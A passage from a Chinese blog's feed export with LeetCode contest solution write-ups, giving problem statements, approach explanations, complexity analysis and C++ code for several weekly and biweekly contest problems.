<p>一个子数组 <code>arr</code> 如果有 至少<code>k</code> 对下标 <code>(i, j)</code> 满足 <code>i &lt; j</code> 且 <code>arr[i] == arr[j]</code> ，那么称它是一个 好 子数组。</p>
<p>子数组 是原数组中一段连续 非空 的元素序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,1,1], k = 10</span><br><span class="line">输出：1</span><br><span class="line">解释：唯一的好子数组是这个数组本身。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,1,4,3,2,2,4], k = 2</span><br><span class="line">输出：4</span><br><span class="line">解释：总共有 4 个不同的好子数组：</span><br><span class="line">- [3,1,4,3,2,2] 有 2 对。</span><br><span class="line">- [3,1,4,3,2,2,4] 有 3 对。</span><br><span class="line">- [1,4,3,2,2,4] 有 2 对。</span><br><span class="line">- [4,3,2,2,4] 有 2 对。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], k &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-328/problems/count-the-number-of-good-subarrays/">https://leetcode.cn/contest/weekly-contest-328/problems/count-the-number-of-good-subarrays/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目还算比较有意思的题目，我们用 $i$ 指向当前子数组的最右边的索引，我们只需要找到最左边的 $j$，此时满足子数组 $nums[j,\cdots,i]$ 为好子数组时，则此时以 $i$ 为结尾的好子数组的个数为 $j + 1$ 个，当前索引从 $0$ 开始。根据上面的思路，我们可以知道只需要快速的统计出 $[j,i]$ 知道的数对的数目即可，此时自然而然我们想到了利用哈希表即可。假设当前区间中元素 $nums[i]$ 个数位 $cnt[nums[i]]$, 此时加入 $nums[i]$ 后数对的个数增加 $cnt[nums[i]]$ 个，我们只需要连续计算即可。每次固定住右边的索引，移动左边的索引 $j$ 即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countGood</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>, curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            curr += cnt[nums[i]];</span><br><span class="line">            cnt[nums[i]]++;</span><br><span class="line">            <span class="keyword">if</span> (curr &gt;= k) &#123;</span><br><span class="line">、                <span class="keyword">while</span> (j &lt;= i &amp;&amp; curr - cnt[nums[j]] + <span class="number">1</span> &gt;= k) &#123;</span><br><span class="line">                    cnt[nums[j]]--;</span><br><span class="line">                    curr -= cnt[nums[j]];</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                res += (j + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6294-最大价值和与最小价值和的差值"><a href="#6294-最大价值和与最小价值和的差值" class="headerlink" title="6294. 最大价值和与最小价值和的差值"></a>6294. 最大价值和与最小价值和的差值</h3><p>给你一个 <code>n</code> 个节点的无向无根图，节点编号为 <code>0</code> 到 <code>n - 1</code> 。给你一个整数 <code>n</code> 和一个长度为 <code>n - 1</code> 的二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示树中节点 <code>ai</code> 和 <code>bi</code> 之间有一条边。</p>
<p>每个节点都有一个价值。给你一个整数数组 <code>price</code> ，其中 <code>price[i]</code> 是第 <code>i</code> 个节点的价值。</p>
<p>一条路径的 价值和 是这条路径上所有节点的价值之和。</p>
<p>你可以选择树中任意一个节点作为根节点 <code>root</code> 。选择 <code>root</code> 为根的 开销 是以 <code>root</code> 为起点的所有路径中，价值和 最大的一条路径与最小的一条路径的差值。</p>
<p>请你返回所有节点作为根节点的选择中，最大 的 开销 为多少。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 6, edges = [[0,1],[1,2],[1,3],[3,4],[3,5]], price = [9,8,7,6,10,5]</span><br><span class="line">输出：24</span><br><span class="line">解释：上图展示了以节点 2 为根的树。左图（红色的节点）是最大价值和路径，右图（蓝色的节点）是最小价值和路径。</span><br><span class="line">- 第一条路径节点为 [2,1,3,4]：价值为 [7,8,6,10] ，价值和为 31 。</span><br><span class="line">- 第二条路径节点为 [2] ，价值为 [7] 。</span><br><span class="line">最大路径和与最小路径和的差值为 24 。24 是所有方案中的最大开销。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, edges = [[0,1],[1,2]], price = [1,1,1]</span><br><span class="line">输出：2</span><br><span class="line">解释：上图展示了以节点 0 为根的树。左图（红色的节点）是最大价值和路径，右图（蓝色的节点）是最小价值和路径。</span><br><span class="line">- 第一条路径包含节点 [0,1,2]：价值为 [1,1,1] ，价值和为 3 。</span><br><span class="line">- 第二条路径节点为 [0] ，价值为 [1] 。</span><br><span class="line">最大路径和与最小路径和的差值为 2 。2 是所有方案中的最大开销。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>0 &lt;= ai, bi &lt;= n - 1</code></li>
<li><code>edges</code> 表示一棵符合题面要求的树。</li>
<li><code>price.length == n</code></li>
<li><code>1 &lt;= price[i] &lt;= 105</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-328/problems/difference-between-maximum-and-minimum-price-sum/">https://leetcode.cn/contest/weekly-contest-328/problems/difference-between-maximum-and-minimum-price-sum/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 树上DP</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目说了一大堆，实际上题目并不复杂，重要的问题在于如何转化。题目要求找到最大价值和，价值和的定义为从根节点开始的最大的一条路径与最小的一条路径的差值。实际上我们仔细分析一下，有两点：</li>
</ol>
<ul>
<li>最大的路径一定为从根节点到某个叶子节点；</li>
<li>最小的路径一定为根节点本身；<br>因此可以得到下面的结论:</li>
<li>最大的价值和的根节点一定为某个叶子节点；</li>
<li>最大的价值和即等于从叶子到某个非叶子节点的最大路径；</li>
</ul>
<ol start="2">
<li>根据以上分析以后题目就变得很简单了，我们只需要求出从叶子节点到非叶子节点的最大路径即可，此时我们可以利用树上 $dp$，每次返回以节点 $p$ 为根节点，求出 $p$ 到以 $p$ 为根节点的子树下面的叶子节点与非叶子节点的最大距离即可。我们很容易求出上述两个值，并求出 $p$ 的子树下叶子节点到非叶子节点的最大距离。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(V)$，其中 $V$ 表示节点的数目。我们只需要遍历一遍即可。</li>
<li>空间复杂度：$O(V + E)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">long</span> <span class="type">long</span>&gt; pll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">pll <span class="title">dfs</span><span class="params">(<span class="type">int</span> root, <span class="type">long</span> <span class="type">long</span> &amp;res, vector&lt;<span class="type">bool</span>&gt; &amp;visit, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;graph, vector&lt;<span class="type">int</span>&gt;&amp; price)</span> </span>&#123;</span><br><span class="line">        visit[root] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> maxdist1 = price[root], maxdist2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> next : graph[root]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[next]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">auto</span> [dist1, dist2] = <span class="built_in">dfs</span>(next, res, visit, graph, price);</span><br><span class="line">            res = <span class="built_in">max</span>(res, <span class="built_in">max</span>(maxdist1 + dist2, maxdist2 + dist1));</span><br><span class="line">            maxdist1 = <span class="built_in">max</span>(maxdist1, dist1 + price[root]);</span><br><span class="line">            maxdist2 = <span class="built_in">max</span>(maxdist2, dist2 + price[root]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;maxdist1, maxdist2&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxOutput</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, vector&lt;<span class="type">int</span>&gt;&amp; price)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">0</span>, res, visit, graph, price);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 95</title>
    <url>/2023/01/23/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/92/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-95"><a href="#leetcode-biweekly-contest-95" class="headerlink" title="leetcode  biweekly contest 95"></a>leetcode  biweekly contest 95</h2><p>最近双周赛的题目质量明显高很多，里面非常多非常有意思的题目，非常值得学习与思考。本次双周赛的题目质量非常高，非常值得学习的题目。</p>
<h3 id="2525-根据规则将箱子分类"><a href="#2525-根据规则将箱子分类" class="headerlink" title="2525. 根据规则将箱子分类"></a>2525. 根据规则将箱子分类</h3><p>给你四个整数 <code>length</code> ，<code>width</code> ，<code>height</code> 和 <code>mass</code> ，分别表示一个箱子的三个维度和质量，请你返回一个表示箱子 <strong>类别</strong> 的字符串。</p>
<ul>
<li><p>如果满足以下条件，那么箱子是 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Bulky&quot;</span><br></pre></td></tr></table></figure>

<p> 的：</p>
<ul>
<li>箱子 <strong>至少有一个</strong> 维度大于等于 <code>104</code> 。</li>
<li>或者箱子的 <strong>体积</strong> 大于等于 <code>109</code> 。</li>
</ul>
</li>
<li><p>如果箱子的质量大于等于 <code>100</code> ，那么箱子是 <code>&quot;Heavy&quot;</code> 的。</p>
</li>
<li><p>如果箱子同时是 <code>&quot;Bulky&quot;</code> 和 <code>&quot;Heavy&quot;</code> ，那么返回类别为 <code>&quot;Both&quot;</code> 。</p>
</li>
<li><p>如果箱子既不是 <code>&quot;Bulky&quot;</code> ，也不是 <code>&quot;Heavy&quot;</code> ，那么返回类别为 <code>&quot;Neither&quot;</code> 。</p>
</li>
<li><p>如果箱子是 <code>&quot;Bulky&quot;</code> 但不是 <code>&quot;Heavy&quot;</code> ，那么返回类别为 <code>&quot;Bulky&quot;</code> 。</p>
</li>
<li><p>如果箱子是 <code>&quot;Heavy&quot;</code> 但不是 <code>&quot;Bulky&quot;</code> ，那么返回类别为 <code>&quot;Heavy&quot;</code> 。</p>
</li>
</ul>
<p><strong>注意</strong>，箱子的体积等于箱子的长度、宽度和高度的乘积。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：length = 1000, width = 35, height = 700, mass = 300</span><br><span class="line">输出：&quot;Heavy&quot;</span><br><span class="line">解释：</span><br><span class="line">箱子没有任何维度大于等于 104 。</span><br><span class="line">体积为 24500000 &lt;= 109 。所以不能归类为 &quot;Bulky&quot; 。</span><br><span class="line">但是质量 &gt;= 100 ，所以箱子是 &quot;Heavy&quot; 的。</span><br><span class="line">由于箱子不是 &quot;Bulky&quot; 但是是 &quot;Heavy&quot; ，所以我们返回 &quot;Heavy&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：length = 200, width = 50, height = 800, mass = 50</span><br><span class="line">输出：&quot;Neither&quot;</span><br><span class="line">解释：</span><br><span class="line">箱子没有任何维度大于等于 104 。</span><br><span class="line">体积为 8 * 106 &lt;= 109 。所以不能归类为 &quot;Bulky&quot; 。</span><br><span class="line">质量小于 100 ，所以不能归类为 &quot;Heavy&quot; 。</span><br><span class="line">由于不属于上述两者任何一类，所以我们返回 &quot;Neither&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= length, width, height &lt;= 105</code></li>
<li><code>1 &lt;= mass &lt;= 103</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/categorize-box-according-to-criteria/description/">https://leetcode.cn/problems/categorize-box-according-to-criteria/description/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1.我们直接判断每个箱子满足几个条件，然后按照题目要求进行分类即可。<br>2. 复杂度分析：</p>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">categorizeBox</span><span class="params">(<span class="type">int</span> length, <span class="type">int</span> width, <span class="type">int</span> height, <span class="type">int</span> mass)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> volume  = (<span class="type">long</span> <span class="type">long</span>)length * height * width;</span><br><span class="line">        <span class="type">bool</span> isBulky = <span class="literal">false</span>,  isHeavy = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (volume &gt;= <span class="number">1e9</span> || length &gt;= <span class="number">10000</span> || width &gt;= <span class="number">10000</span> || height &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">            isBulky = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mass &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">            isHeavy = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isBulky &amp;&amp; isHeavy) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Both&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isBulky &amp;&amp; !isHeavy) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Neither&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isBulky) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bulky&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Heavy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2526-找到数据流中的连续整数"><a href="#2526-找到数据流中的连续整数" class="headerlink" title="2526. 找到数据流中的连续整数"></a>2526. 找到数据流中的连续整数</h3><p>给你一个整数数据流，请你实现一个数据结构，检查数据流中最后 <code>k</code> 个整数是否 <strong>等于</strong> 给定值 <code>value</code> 。</p>
<p>请你实现 <strong>DataStream</strong> 类：</p>
<ul>
<li><code>DataStream(int value, int k)</code> 用两个整数 <code>value</code> 和 <code>k</code> 初始化一个空的整数数据流。</li>
<li><code>boolean consec(int num)</code> 将 <code>num</code> 添加到整数数据流。如果后 <code>k</code> 个整数都等于 <code>value</code> ，返回 <code>true</code> ，否则返回 <code>false</code> 。如果少于 <code>k</code> 个整数，条件不满足，所以也返回 <code>false</code> 。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;DataStream&quot;, &quot;consec&quot;, &quot;consec&quot;, &quot;consec&quot;, &quot;consec&quot;]</span><br><span class="line">[[4, 3], [4], [4], [4], [3]]</span><br><span class="line">输出：</span><br><span class="line">[null, false, false, true, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">DataStream dataStream = new DataStream(4, 3); // value = 4, k = 3 </span><br><span class="line">dataStream.consec(4); // 数据流中只有 1 个整数，所以返回 False 。</span><br><span class="line">dataStream.consec(4); // 数据流中只有 2 个整数</span><br><span class="line">                      // 由于 2 小于 k ，返回 False 。</span><br><span class="line">dataStream.consec(4); // 数据流最后 3 个整数都等于 value， 所以返回 True 。</span><br><span class="line">dataStream.consec(3); // 最后 k 个整数分别是 [4,4,3] 。</span><br><span class="line">                      // 由于 3 不等于 value ，返回 False 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= value, num &lt;= 109</code></li>
<li><code>1 &lt;= k &lt;= 105</code></li>
<li>至多调用 <code>consec</code> 次数为 <code>105</code> 次。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-consecutive-integers-from-a-data-stream/">https://leetcode.cn/problems/find-consecutive-integers-from-a-data-stream/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>栈
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>保存栈顶元素 $x$ 的个数为 $freq[x]$，则此时加入新的元素 $num$ 时:</li>
</ol>
<ul>
<li>如果 $num &#x3D; x$，则此时栈顶的元素仍然为 $x$，且栈顶元素的个数为 $freq[x] + 1$；</li>
<li>如果 $num \neq x$，则此时栈顶的元素为 $num$，且栈顶元素的个数为 $freq[num] &#x3D; 1$；<br>我们检测栈顶的元素是否为 $value$，且栈顶的元素个数是否大于等于 $k$ 即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$，其中 $\text{consec}$ 的时间复杂度为 $O(1)$。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为插入元素的次数。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataStream</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DataStream</span>(<span class="type">int</span> value, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;value = value;</span><br><span class="line">        <span class="keyword">this</span>-&gt;k = k;</span><br><span class="line">        arr.<span class="built_in">emplace_back</span>(<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">consec</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num == arr.<span class="built_in">back</span>().first) &#123;</span><br><span class="line">            arr.<span class="built_in">back</span>().second++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(num, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (arr.<span class="built_in">back</span>().first == value &amp;&amp; arr.<span class="built_in">back</span>().second &gt;= k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">    <span class="type">int</span> value, k;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2527-查询数组-Xor-美丽值"><a href="#2527-查询数组-Xor-美丽值" class="headerlink" title="2527. 查询数组 Xor 美丽值"></a>2527. 查询数组 Xor 美丽值</h3><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 。</p>
<p>三个下标 <code>i</code> ，<code>j</code> 和 <code>k</code> 的 <strong>有效值</strong> 定义为 <code>((nums[i] | nums[j]) &amp; nums[k])</code> 。</p>
<p>一个数组的 <strong>xor 美丽值</strong> 是数组中所有满足 <code>0 &lt;= i, j, k &lt; n</code> <strong>的三元组</strong> <code>(i, j, k)</code> 的 <strong>有效值</strong> 的异或结果。</p>
<p>请你返回 <code>nums</code> 的 xor 美丽值。</p>
<p><strong>注意：</strong></p>
<ul>
<li><code>val1 | val2</code> 是 <code>val1</code> 和 <code>val2</code> 的按位或。</li>
<li><code>val1 &amp; val2</code> 是 <code>val1</code> 和 <code>val2</code> 的按位与。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,4]</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">三元组和它们对应的有效值如下：</span><br><span class="line">- (0,0,0) 有效值为 ((1 | 1) &amp; 1) = 1</span><br><span class="line">- (0,0,1) 有效值为 ((1 | 1) &amp; 4) = 0</span><br><span class="line">- (0,1,0) 有效值为 ((1 | 4) &amp; 1) = 1</span><br><span class="line">- (0,1,1) 有效值为 ((1 | 4) &amp; 4) = 4</span><br><span class="line">- (1,0,0) 有效值为 ((4 | 1) &amp; 1) = 1</span><br><span class="line">- (1,0,1) 有效值为 ((4 | 1) &amp; 4) = 4</span><br><span class="line">- (1,1,0) 有效值为 ((4 | 4) &amp; 1) = 0</span><br><span class="line">- (1,1,1) 有效值为 ((4 | 4) &amp; 4) = 4 </span><br><span class="line">数组的 xor 美丽值为所有有效值的按位异或 1 ^ 0 ^ 1 ^ 4 ^ 1 ^ 4 ^ 0 ^ 4 = 5 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [15,45,20,2,34,35,5,44,32,30]</span><br><span class="line">输出：34</span><br><span class="line">解释：数组的 xor 美丽值为 34 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-326/problems/partition-string-into-substrings-with-values-at-most-k/">https://leetcode.cn/contest/weekly-contest-326/problems/partition-string-into-substrings-with-values-at-most-k/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学思路
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>比赛的时候直接盲猜的答案，结果果真猜对了。题目看起来复杂的，实际解法都会非常的巧妙。但是实际的解法非常好的思考角度，根据题目给定的组合公式 $((nums[i] | nums[j]) \And nums[k])$，可以有如下结论:</li>
</ol>
<ul>
<li>如果 $i &#x3D; j &#x3D; k$，此时上述组合公式的结果一定为 $\textit{nums[i]}$；</li>
<li>如果 $i \neq j$，则此时或运算满足交换定理，则此时我们知道如果存在 $x &#x3D; ((nums[i] | nums[j]) \And nums[k])$，则此时一定存在 $y &#x3D; ((nums[j] | nums[i]) \And nums[k])$，此时我们知道 $x &#x3D; y$，此时 $x \oplus y &#x3D; 0$，因此最终的结果一定可以省略掉 $i \neq j$ 的项；</li>
<li>如果 $i &#x3D; j, i \neq k$，此时上述等式即等于 $((nums[i] | nums[j]) \And nums[k]) &#x3D; nums[i] \And nums[k]$，则此时与运算满足交换定理，则此时我们知道如果存在 $x &#x3D; nums[i] \And nums[k]$，则此时一定存在 $y &#x3D; nums[k]<br>\And nums[i]$，此时我们知道 $x &#x3D; y$，此时 $x \oplus y &#x3D; 0$，因此最终的结果一定可以省略掉 $i &#x3D; j, i \neq k$ 的项；</li>
<li>最终我们知道只剩下 $i &#x3D; j &#x3D; k$ 的项。</li>
</ul>
<ol start="2">
<li>还有另外一种数学解法解释的也非常详细，非常值得思考的题目，本次双周赛的题目质量非常高。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">xorBeauty</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            res ^= x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2528-最大化城市的最小供电站数目"><a href="#2528-最大化城市的最小供电站数目" class="headerlink" title="2528. 最大化城市的最小供电站数目"></a>2528. 最大化城市的最小供电站数目</h3><p>给你一个下标从 <strong>0</strong> 开始长度为 <code>n</code> 的整数数组 <code>stations</code> ，其中 <code>stations[i]</code> 表示第 <code>i</code> 座城市的供电站数目。</p>
<p>每个供电站可以在一定 <strong>范围</strong> 内给所有城市提供电力。换句话说，如果给定的范围是 <code>r</code> ，在城市 <code>i</code> 处的供电站可以给所有满足 <code>|i - j| &lt;= r</code> 且 <code>0 &lt;= i, j &lt;= n - 1</code> 的城市 <code>j</code> 供电。</p>
<ul>
<li><code>|x|</code> 表示 <code>x</code> 的 <strong>绝对值</strong> 。比方说，<code>|7 - 5| = 2</code> ，<code>|3 - 10| = 7</code> 。</li>
</ul>
<p>一座城市的 <strong>电量</strong> 是所有能给它供电的供电站数目。</p>
<p>政府批准了可以额外建造 <code>k</code> 座供电站，你需要决定这些供电站分别应该建在哪里，这些供电站与已经存在的供电站有相同的供电范围。</p>
<p>给你两个整数 <code>r</code> 和 <code>k</code> ，如果以最优策略建造额外的发电站，返回所有城市中，最小供电站数目的最大值是多少。</p>
<p>这 <code>k</code> 座供电站可以建在多个城市。</p>
<p><strong>示例 1：</strong></p>
